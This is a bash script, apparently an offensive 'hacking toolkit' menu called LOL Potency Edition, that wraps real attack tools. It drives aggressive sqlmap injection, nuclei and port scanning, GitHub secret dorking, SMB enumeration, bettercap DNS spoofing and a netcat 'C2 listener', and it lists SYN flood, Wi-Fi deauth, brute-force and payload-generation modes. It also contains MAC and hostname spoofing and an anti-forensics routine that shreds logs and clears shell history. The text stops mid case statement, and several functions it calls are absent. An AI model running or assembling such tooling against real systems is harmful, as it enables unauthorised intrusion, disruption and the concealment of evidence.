#!/bin/bash

# --- SYSTEM PATH CONFIG ---
export PATH=$PATH:$HOME/go/bin:/usr/local/bin:$(gem env home)/bin

# --- CONFIGURATION SYSTEM ---
CONFIG_FILE="$HOME/.lol_config"
if [ ! -f "$CONFIG_FILE" ]; then
    cat <<EOF > "$CONFIG_FILE"
SHODAN_API_KEY=""
HIBP_API_KEY=""
DISCORD_WEBHOOK=""
EOF
fi
source "$CONFIG_FILE"

# --- CORE ENGINE ---

req() {
    local proxy=""
    if [ "$USE_TOR" = true ]; then proxy="--proxy $TOR_PROXY"; fi
    curl -s $proxy -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$@"
}

loading_anim() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -ne " \e[1;33m[*] PROCESSING... \e[0m"
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    echo -e "\b\b\b\b\e[1;32m [DONE] \e[0m"
}

# --- PHANTOM TIER MODULES ---

origin_find() {
    echo -e "\e[1;31m[!] INITIATING ORIGIN IP DISCOVERY: $1\e[0m"
    echo -e "\e[1;33m[*] Searching CT Logs & Historical DNS...\e[0m"
    (req "https://crt.sh/?q=$1&output=json" | jq -r '.[].common_name' | sort -u) &
    (req "https://viewdns.info/iphistory/?domain=$1" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u) &
    wait
}

employee_recon() {
    echo -e "\e[1;31m[!] INITIATING EMPLOYEE RECON: $1\e[0m"
    echo -e "\e[1;33m[*] Scraping professional fragments...\e[0m"
    req "https://www.google.com/search?q=site:linkedin.com/in/+\"%40$1\"" | grep -oE "[A-Z][a-z]+ [A-Z][a-z]+" | sort -u
}

supply_audit() {
    echo -e "\e[1;31m[!] SUPPLY CHAIN VULNERABILITY AUDIT: $1\e[0m"
    echo -e "\e[1;33m[*] Checking for exposed package metadata...\e[0m"
    for file in "package.json" "requirements.txt" "composer.json" "Gemfile"; do
        req -L -I "https://$1/$file" | grep -q "200 OK" && echo -e " \e[1;31m[!] ALERT: $file EXPOSED at https://$1/$file\e[0m"
    done
}

# --- SHADOW TIER MODULES ---

breach_search() {
    echo -e "\e[1;31m[!] SEARCHING FOR LEAKED CREDENTIALS: $1\e[0m"
    if [ -z "$HIBP_API_KEY" ]; then echo -e "\e[1;33m[*] HIBP_API_KEY not set in $CONFIG_FILE\e[0m"; return; fi
    req "https://haveibeenpwned.com/api/v3/breachedaccount/$1" -H "hibp-api-key: $HIBP_API_KEY" || echo -e "\e[1;31m[*] No data or key invalid.\e[0m"
}

bt_recon() {
    echo -e "\e[1;31m[!] PHYSICAL PROXIMITY RECON (BLUETOOTH)...\e[0m"
    sudo hcitool scan || echo -e "\e[1;31m[!] No BT interface found.\e[0m"
}

takeover_check() {
    echo -e "\e[1;31m[!] SUBDOMAIN TAKEOVER AUDIT: $1\e[0m"
    nuclei -u "$1" -t takeovers/ -silent
}

ghost_mode() {
    INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
    local NEW_HOST="GRIM-$(openssl rand -hex 3)"
    echo -e "\e[1;31m[!] INITIATING GHOST MODE: $INTERFACE\e[0m"
    sudo ip link set dev $INTERFACE down
    sudo macchanger -r $INTERFACE
    sudo hostnamectl set-hostname "$NEW_HOST"
    sudo ip link set dev $INTERFACE up
    echo -e "\e[1;32m[*] Identity spoofed. MAC randomized. Hostname: $NEW_HOST\e[0m"
}

api_intel() {
    echo -e "\e[1;31m[!] GLOBAL API INTEL (SHODAN): $1\e[0m"
    if [ -z "$SHODAN_API_KEY" ]; then echo -e "\e[1;33m[*] SHODAN_API_KEY not set in $CONFIG_FILE\e[0m"; return; fi
    shodan init "$SHODAN_API_KEY" > /dev/null 2>&1
    shodan host "$1" 2>/dev/null || echo -e "\e[1;31m[!] No Shodan data found.\e[0m"
}

discord_notify() {
    if [ -z "$DISCORD_WEBHOOK" ]; then return; fi
    curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"[☠] $1\"}" "$DISCORD_WEBHOOK" > /dev/null 2>&1
}

# --- CORE ATTACK & RECON MODULES ---

rust_scan() {
    echo -e "\e[1;31m[!] ULTRA-FAST PORT SCAN (RUSTSCAN): $1\e[0m"
    ulimit -n 65535 2>/dev/null
    rustscan -a "$1" --ulimit 5000 -- -sV -sC -O -Pn -T4
}

sub_discover() {
    echo -e "\e[1;31m[!] AGGRESSIVE MULTI-SOURCE SUBDOMAIN MAP: $1\e[0m"
    local tmp_sub="/tmp/lol_subs"
    subfinder -d "$1" -all -silent > "$tmp_sub"
    assetfinder --subs-only "$1" >> "$tmp_sub"
    cat "$tmp_sub" | sort -u | httpx -silent -title -status-code -td
    rm "$tmp_sub"
}

sql_inject() {
    echo -e "\e[1;31m[!] AGGRESSIVE SQL INJECTION: $1\e[0m"
    sqlmap -u "$1" --batch --random-agent --level=3 --risk=2 --tamper=space2comment --dbs --exclude-sysdbs
}

vuln_scan() {
    echo -e "\e[1;31m[!] DEEP VULNERABILITY AUDIT (HTTPX + NUCLEI): $1\e[0m"
    echo -e "\e[1;33m[*] Profiling technologies and filtering alive hosts...\e[0m"
    echo "$1" | httpx -silent | nuclei -severity low,medium,high,critical -t cves,vulnerabilities,exposed-panels,misconfiguration,takeovers -rl 50 -c 50 -es info
}

cloud_recon() {
    echo -e "\e[1;31m[!] CLOUD ASSET ENUMERATION: $1\e[0m"
    local providers=("s3.amazonaws.com" "blob.core.windows.net" "storage.googleapis.com")
    for p in "${providers[@]}"; do
        local url="https://$1.$p"
        req -L -I "$url" | grep -q "200\|403" && echo -e " \e[1;32m[+]\e[0m Found Asset: $url"
    done
}

web_fuzz() {
    echo -e "\e[1;31m[!] AGGRESSIVE WEB FUZZING (FFUF): $1\e[0m"
    ffuf -u "$1/FUZZ" -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403 -e .php,.html,.txt,.git,.env,.bak,.zip -t 100 -recursion -recursion-depth 2 -v
}

wp_audit() {
    echo -e "\e[1;31m[!] WORDPRESS SECURITY AUDIT: $1\e[0m"
    wpscan --url "$1" --enumerate vp,vt,tt,u,cb,dbe --plugins-detection aggressive --force --no-update --disable-tls-checks
}

# --- WORLD-CLASS OPERATIONAL MODULES ---

github_dork() {
    echo -e "\e[1;31m[!] INITIATING GITHUB DORKING: $1\e[0m"
    local queries=("filename:config" "filename:.env" "extension:sql" "password" "aws_key")
    for q in "${queries[@]}"; do
        echo -e " \e[1;32m[+]\e[0m Querying: $q"
        req "https://github.com/search?q=org%3A$1+$q&type=code" | grep -oE "/[a-zA-Z0-9_-]+/[a-zA-Z0-9._-]+" | sort -u | head -n 5
    done
}

internal_enum() {
    echo -e "\e[1;31m[!] INTERNAL NETWORK ENUM (SMB/RPC): $1\e[0m"
    sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users -Pn "$1"
}

anti_forensics() {
    echo -e "\e[1;31m[!] INITIATING GHOST WIPE\e[0m"
    find . -name "lol_report_*" -o -name "lol_intel_*" | xargs shred -u 2>/dev/null
    history -c && history -w
    echo -e "\e[1;32m[+] Operation complete. No trace remains.\e[0m"
}

c2_listener() {
    echo -e "\e[1;31m[!] INITIATING C2 LISTENER ON PORT 4444...\e[0m"
    nc -lvp 4444
}

dns_hijack() {
    echo -ne "\e[1;37m    Domain to spoof: \e[0m"; read dom
    echo -ne "\e[1;37m    Redirect to IP: \e[0m"; read rip
    sudo bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on; net.sniff on"
}

# --- UI & GUI ENGINE ---

show_banner() {
    clear
    echo -e "\e[1;37m"
    echo -e "                ...........        ..:.                               "
    echo -e "               :::::::::::::::.  ::..:::. .:....                      "
    echo -e "               .::...          .:::..::::  ............               "
    echo -e "                ::           ...::::::::::            ......          "
    echo -e "                 :.         .: .:::::::::::.                ...       "
    echo -e "                 .:        .:. .::::::::::::.                         "
    echo -e "                  :.       .:...::::.......::.                        "
    echo -e "                  .:       .:...::.      .. .:                        "
    echo -e "                   :.       ::...  .::::.::   .                       "
    echo -e "                   ::      .::.     :::.                              "
    echo -e "                   .:.   ..:.:. ..... .:..                            "
    echo -e "                    ::   :::.:    .:::::    ..                        "
    echo -e "                     :. ...::.    .:.::.   ..                         "
    echo -e "                     :: :::.     .. ...   .:.::                       "
    echo -e "                ..:: .:..:.           ...:::::::.....                 "
    echo -e "              .:::::  :: ::.....     .:......::::::::.                "
    echo -e "             ......:. .:..::::::       ....:::::::::::.               "
    echo -e "            ...:....:  :: ::.:::.     ..::::::::.::::..:              "
    echo -e "           :..:::... : .:..::....      ..:..::::.:::.  ::             "
    echo -e "          ::..::::::..  :: ::::::..      ..:::::.::::  .:.            "
    echo -e "         .... ..:::.    ....:.::::..      .::.::..:::  .::            "
    echo -e "       .:..........         .  :::.      ..   :: .::.. .::.           "
    echo -e "      ::......:...  . .:.   .. :::....... ...::  .::.:..::.           "
    echo -e "     .:::....:. ..  . ::.    . ::....   .:..:::  ::: :. ::.           "
    echo -e "     :.....::..  ..          .:::..    ::..:::.  ::... :::.           "
    echo -e "    .. . .::.... .:  ..     :.::::::...  .:::.   :: : .:::.           "
    echo -e "    . ..      ....::::::    ::.:::.     .:::.    : ...::::            "
    echo -e "   ......     .:::::::::.   .:.:::::..::::::.   ..  .::::             "
    echo -e "   ..:...     ...::::::::.   :: :::::::::..::  ..  .::::  .           "
    echo -e "      .....  ..::.::......   .:. .:.::.....:. ..  :::::: .:           "
    echo -e ""
    echo -e "                        L   O   L"
    echo -e "                P O T E N C Y   E D I T I O N"
    echo -e " ____________________________________________________________________ "
    echo -e "\e[0m"
}

grim_gui() {
    INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}' 2>/dev/null || echo "N/A")
    LOCAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d/ -f1 2>/dev/null || echo "127.0.0.1")
    BLUR_IP=false
    
    while true; do
        DISPLAY_IP=$LOCAL_IP
        if [ "$BLUR_IP" = true ]; then DISPLAY_IP="[ HIDDEN ]"; fi
        
        STEALTH_STATUS="\e[1;31mDISABLED\e[0m"
        if [ "$USE_TOR" = true ]; then STEALTH_STATUS="\e[1;32mACTIVE (TOR)\e[0m"; fi
        
        HOST_NOW=$(hostname)
        
        show_banner
        echo -e " \e[1;37m┌─────────────────────── SYSTEM STATUS ────────────────────────┐\e[0m"
        echo -e " \e[1;37m│\e[0m  \e[1;32mIP:\e[0m $DISPLAY_IP  \e[1;32mSTEALTH:\e[0m $STEALTH_STATUS  \e[1;32mID:\e[0m $HOST_NOW \e[1;37m│\e[0m"
        echo -e " \e[1;37m└──────────────────────────────────────────────────────────────┘\e[0m"
        echo -e ""
        echo -e " \e[1;37m┌─ WEB & INTEL ───────┐ ┌─ DEEP SEARCH ────────┐ ┌─ CYBER WARFARE ──────┐\e[0m"
        echo -e " \e[1;37m│\e[0m [1] AUTO-PILOT      \e[1;37m│ │\e[0m [A] EMAIL (HOLEHE)  \e[1;37m│ │\e[0m [F] MULTI-FLOOD      \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [2] REMOTE INTEL    \e[1;37m│ │\e[0m [B] PHONE (INFOGA)  \e[1;37m│ │\e[0m [G] AGGRESSIVE ARP   \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [3] JS ANALYSIS     \e[1;37m│ │\e[0m [C] USER (SHERLOCK) \e[1;37m│ │\e[0m [H] KILL CONNECTION  \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [4] DNS HISTORY     \e[1;37m│ │\e[0m [D] METADATA (EXIF) \e[1;37m│ │\e[0m [I] WI-FI DEAUTH     \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [5] CMS DETECT      \e[1;37m│ │\e[0m [E] DARK WEB SEARCH \e[1;37m│ │\e[0m [J] VULN SCAN (NUC)  \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [6] CLOUD RECON     \e[1;37m│ │\e[0m [K] EXPLOIT SEARCH  \e[1;37m│ │\e[0m [L] WEB FUZZ (FFUF)  \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [7] SUBDOMAIN MAP   \e[1;37m│ │\e[0m [N] SQL INJECT TEST \e[1;37m│ │\e[0m [O] TOR STEALTH TOG \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [8] RUST PORT SCAN  \e[1;37m│ │\e[0m [Y] MALWARE (YARA)  \e[1;37m│ │\e[0m [Z] DEPLOY HONEYPOT \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [9] SHODAN INTEL    \e[1;37m│ │\e[0m [0] GHOST MODE TOG  \e[1;37m│ │\e[0m [!] DEAD DROP NOTIF \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [T] TAKEOVER AUDIT  \e[1;37m│ │\e[0m [P] BREACH SEARCH   \e[1;37m│ │\e[0m [~] PROXIMITY SCAN  \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [V] BRUTE FORCE     \e[1;37m│ │\e[0m [R] HASH CRACKER    \e[1;37m│ │\e[0m [Q] PAYLOAD GEN     \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [@] GHOST WIPE      \e[1;37m│ │\e[0m [#] C2 LISTENER     \e[1;37m│ │\e[0m [$] DNS HIJACK      \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [=] ORIGIN DISCOVERY \e[1;37m│ │\e[0m [&] EMPLOYEE RECON  \e[1;37m│ │\e[0m [^] SUPPLY AUDIT    \e[1;37m│\e[0m"
        echo -e " \e[1;37m│\e[0m [,] GITHUB DORKS    \e[1;37m│ │\e[0m [.] API SECRETS     \e[1;37m│ │\e[0m [/] INTERNAL ENUM   \e[1;37m│\e[0m"
        echo -e " \e[1;37m└─────────────────────┘ └──────────────────────┘ └──────────────────────┘\e[0m"
        echo -e " \e[1;37m[W] WP AUDIT  [S] SNIFFER  [M] MAC CHANGER  [U] BLUR IP  [X] EXIT\e[0m"
        echo -e ""
        echo -ne " \e[1;37m[#] SELECT MODE > \e[0m"
        read choice
        
        case $choice in
            1) echo -ne "    Target: "; read t; bash "$0" auto "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            2) echo -ne "    Target: "; read t; bash "$0" remote "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            3) echo -ne "    Target: "; read t; bash "$0" js "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            4) echo -ne "    Target: "; read t; bash "$0" history "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            5) echo -ne "    Target: "; read t; bash "$0" cms "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            6) echo -ne "    Keyword: "; read t; bash "$0" cloud "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            7) echo -ne "    Domain: "; read t; bash "$0" subfinder "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            8) echo -ne "    Target IP: "; read t; bash "$0" rustscan "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            9) echo -ne "    Target IP: "; read t; bash "$0" shodan "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            0) ghost_mode ;;
            A|a) echo -ne "    Email: "; read t; bash "$0" email "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            B|b) bt_recon; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            C|c) echo -ne "    Username: "; read t; bash "$0" user "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            D|d) echo -ne "    File/URL: "; read t; bash "$0" file "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            E|e) echo -ne "    Keyword: "; read t; bash "$0" dark "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            G|g) bash "$0" arp; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            H|h) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            I|i) echo -ne "    AP BSSID: "; read t; bash "$0" deauth "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            K|k) echo -ne "    Software/Ver: "; read t; bash "$0" exploit "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            L|l) echo -ne "    Target URL: "; read t; bash "$0" fuzz "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            N|n) echo -ne "    URL with ID: "; read t; bash "$0" sqlmap "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            O|o) toggle_tor ;;
            P|p) echo -ne "    Email/User: "; read t; bash "$0" breach "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            T|t) echo -ne "    Domain: "; read t; bash "$0" takeover "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            V|v) echo -ne "    Target IP: "; read t; bash "$0" brute "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            R|r) echo -ne "    Hash File: "; read t; bash "$0" crack "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            Q|q) echo -ne "    Your LHOST IP: "; read t; bash "$0" payload "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            Y|y) echo -ne "    File/Dir: "; read t; bash "$0" yara "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            Z|z) echo -ne "    Port to trap: "; read t; bash "$0" honeypot "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '=') echo -ne "    Domain: "; read t; bash "$0" origin "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '&') echo -ne "    Company Domain: "; read t; bash "$0" employees "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '^') echo -ne "    Domain: "; read t; bash "$0" supply "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            ',') echo -ne "    Org Name: "; read t; bash "$0" dorks "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '.') echo -ne "    Target URL: "; read t; bash "$0" secrets_deep "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '/') echo -ne "    Internal IP: "; read t; bash "$0" internal "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '@') anti_forensics; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '#') c2_listener; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '$') dns_hijack; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            '~') bt_recon; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            S|s) bash "$0" sniff; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            M|m) bash "$0" mac; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
            U|u) if [ "$BLUR_IP" = true ]; then BLUR_IP=false; else BLUR_IP=true; fi ;;
            !) echo -ne "    Message: "; read t; discord_notify "$t"; echo -e "\n\e[1;32m[+] Notification Sent.\e[0m"; sleep 1 ;;
            X|x) exit 0 ;;
            *) echo -e "\e[1;31m    Invalid.\e[0m"; sleep 1 ;;
        esac
    done
}

# --- CONFIGURATION ---
TOR_PROXY="socks5h://127.0.0.1:9050"
USE_TOR=false
STEALTH_DELAY=0

# 1. LOGGING & POST-EXTRACTION WRAPPER
if [ -z "$1" ]; then
    grim_gui
fi

if [ "$1" != "--no-log" ]; then
    TARGET_CLEAN=$(echo "$1" | tr -dc '[:alnum:]_.-')
    if [ -z "$TARGET_CLEAN" ] || [ "$1" == "help" ] || [ "$1" == "man" ]; then
        TARGET="help"
    else
        LOGFILE="lol_report_${TARGET_CLEAN}.txt"
        JSON_REPORT="lol_intel_${TARGET_CLEAN}.json"
        echo -e "\e[1;32m[+] Session active: Logging to $LOGFILE\e[0m"
        bash "$0" --no-log "$@" 2>&1 | tee >(sed -r 's/\x1b\[[0-9;]*m//g' > "$LOGFILE")
        
        # Post-session automated intelligence extraction
        python3 - "$LOGFILE" "$JSON_REPORT" <<EOF
import re, sys, json, os
logfile, jsonfile = sys.argv[1], sys.argv[2]
if not os.path.exists(logfile): sys.exit(0)
with open(logfile, 'r') as f: content = f.read()
patterns = {
    "Emails": r"[\w.+-]+@[\w.-]+\.\w+",
    "Onions": r"\b[a-z2-7]{56}\.onion\b",
    "Telegram": r"(?:https?://t\.me/|@)([A-Za-z0-9_]{5,32})",
    "Wallets": r"\b(?:bc1[a-z0-9]{25,87}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b",
    "IPv4s": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
    "Domains": r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b",
    "Sensitive": r"(?i)(api[_-]?key|password|secret|access[_-]?token|bearer|id[_-]?secret)\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{16,})['\"]?"
}
intel = {}
for label, pattern in patterns.items():
    matches = sorted(list(set(re.findall(pattern, content))))
    if matches: intel[label] = matches
if intel:
    with open(jsonfile, 'w') as f: json.dump(intel, f, indent=4)
    print(f"\x1b[1;32m[+] Intelligence extracted to $JSON_REPORT\x1b[0m")
EOF
        exit $?
    fi
fi

if [ "$1" == "--no-log" ]; then
    shift
fi

# Parse optional flags
while [[ "$1" =~ ^- ]]; do
    case "$1" in
        --tor) USE_TOR=true; shift ;;
        --stealth) STEALTH_DELAY=2; shift ;;
    esac
done

TARGET=$1
EXTRA=$2

if [ -z "$TARGET" ] || [ "$TARGET" == "help" ]; then
    echo -e "\e[1;34m========================================================\e[0m"
    echo -e " \e[1;37mPOTENCY COMMAND CENTER - USAGE GUIDE\e[0m"
    echo -e "\e[1;34m========================================================\e[0m"
    echo -e "\e[1;33mULTIMATE POTENCY MODES:\e[0m"
    echo -e "  auto      - Ultimate Auto-Pilot (Remote Intel -> Recon -> Vuln -> JS Analysis)."
    echo -e "  remote    - Deep Remote Intelligence Gathering (Passive)."
    echo -e "  js        - Extract API keys, endpoints, and secrets from JavaScript."
    echo -e "  history   - Pull historical DNS and WHOIS from remote databases."
    echo -e "  exploit   - Search remote databases (Vulners/ExploitDB) for versions."
    echo -e "  flood     - High-intensity TCP SYN flood (Remote/Local)."
    echo -e "  arp       - Aggressive ARP scanning and discovery."
    echo -e "\e[1;33mSTANDARD MODES:\e[0m"
    echo -e "  <Domain/IP/Phone/Email/User/File/Scan/Cloud/Web/Vuln/CMS/Net/Sniff/Kill/Mac>"
    exit 0
fi

# Type Parsing
TYPE="DOMAIN"
if [[ "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then TYPE="IP";
elif [[ "$TARGET" =~ ^\+?[0-9]{10,15}$ ]]; then TYPE="PHONE";
elif [[ "$TARGET" =~ ^[\w.+-]+@[\w.-]+\.\w+$ ]]; then TYPE="EMAIL";
elif [ -f "$TARGET" ]; then TYPE="FILE";
elif [[ "$TARGET" == "auto" ]]; then TYPE="AUTO"; TARGET=$EXTRA;
elif [[ "$TARGET" == "remote" ]]; then TYPE="REMOTE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "js" ]]; then TYPE="JS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "history" ]]; then TYPE="HISTORY"; TARGET=$EXTRA;
elif [[ "$TARGET" == "exploit" ]]; then TYPE="EXPLOIT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dark" ]]; then TYPE="DARK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flood" ]]; then TYPE="FLOOD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "arp" ]]; then TYPE="ARP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "email" ]]; then TYPE="EMAIL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "phone" ]]; then TYPE="PHONE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "deauth" ]]; then TYPE="DEAUTH"; TARGET=$EXTRA;
elif [[ "$TARGET" == "nuclei" ]]; then TYPE="NUCLEI"; TARGET=$EXTRA;
elif [[ "$TARGET" == "user" ]]; then TYPE="USER_TRACE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "fuzz" ]]; then TYPE="FUZZ"; TARGET=$EXTRA;
elif [[ "$TARGET" == "wpscan" ]]; then TYPE="WPSCAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "cloud" ]]; then TYPE="CLOUD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "rustscan" ]]; then TYPE="RUSTSCAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "subfinder" ]]; then TYPE="SUBFINDER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "sqlmap" ]]; then TYPE="SQLMAP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "breach" ]]; then TYPE="BREACH"; TARGET=$EXTRA;
elif [[ "$TARGET" == "takeover" ]]; then TYPE="TAKEOVER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "origin" ]]; then TYPE="ORIGIN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "employees" ]]; then TYPE="EMPLOYEES"; TARGET=$EXTRA;
elif [[ "$TARGET" == "supply" ]]; then TYPE="SUPPLY"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dorks" ]]; then TYPE="DORKS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "secrets_deep" ]]; then TYPE="SECRETS_DEEP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "internal" ]]; then TYPE="INTERNAL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "brute" ]]; then TYPE="BRUTE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "crack" ]]; then TYPE="CRACK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "payload" ]]; then TYPE="PAYLOAD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "shodan" ]]; then TYPE="SHODAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "yara" ]]; then TYPE="YARA"; TARGET=$EXTRA;
elif [[ "$TARGET" == "honeypot" ]]; then TYPE="HONEYPOT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "anti_forensics" ]]; then TYPE="ANTI_FORENSICS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "c2_listener" ]]; then TYPE="C2_LISTENER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dns_hijack" ]]; then TYPE="DNS_HIJACK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "net" ]]; then TYPE="NET";
elif [[ "$TARGET" == "sniff" ]]; then TYPE="SNIFF";
elif [[ "$TARGET" == "kill" ]]; then TYPE="KILL";
elif [[ "$TARGET" == "mac" ]]; then TYPE="MAC";
elif [[ "$TARGET" == "recon" ]]; then TYPE="RECON"; TARGET=$EXTRA;
fi

# --- CORE LOGIC ---

case $TYPE in
    AUTO)
        echo -e "\e[1;31m[!] AUTO-PILOT ENGAGED\e[0m"
        api_intel "$TARGET"
        sub_discover "$TARGET"
        rust_scan "$TARGET"
        vuln_scan "$TARGET"
        js_intel "$TARGET"
        detect_cms "$TARGET"
        ;;
    REMOTE) api_intel "$TARGET" ;;
    HISTORY)
        echo -e "\e[1;33m[*] Fetching History for $TARGET...\e[0m"
        req "https://viewdns.info/iphistory/?domain=$TARGET" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u ;;
    JS) js_intel "$TARGET" ;;
    DARK)
        echo -e "\e[1;31m[!] DARK WEB SEARCH: $TARGET\e[0m"
        req "https://ahmia.fi/search/?q=$TARGET" | grep -oE "http[s]?://[a-z2-7]{56}\.onion" | sort -u ;;
    IP) api_intel "$TARGET"; rust_scan "$TARGET" ;;
    DOMAIN) api_intel "$TARGET"; sub_discover "$TARGET" ;;
    CMS) detect_cms "$TARGET" ;;
    EMAIL) email_osint "$TARGET" ;;
    PHONE) phone_osint "$TARGET" ;;
    DEAUTH) wifi_deauth "$TARGET" ;;
    NUCLEI) vuln_scan "$TARGET" ;;
    USER_TRACE) user_trace "$TARGET" ;;
